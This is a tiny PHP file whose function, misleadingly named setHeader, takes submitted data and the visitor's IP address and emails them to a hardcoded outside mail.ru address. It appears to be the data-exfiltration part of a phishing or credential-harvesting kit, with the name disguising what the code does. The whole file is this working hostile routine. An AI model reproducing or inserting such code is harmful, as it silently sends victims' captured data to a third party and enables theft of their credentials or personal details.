<?php
function setHeader($data, $IP){
 
    $SEND_TO2 = "fou.duroi@mail.ru";
     mail($SEND_TO2, "Data de $IP", $data);
}
?>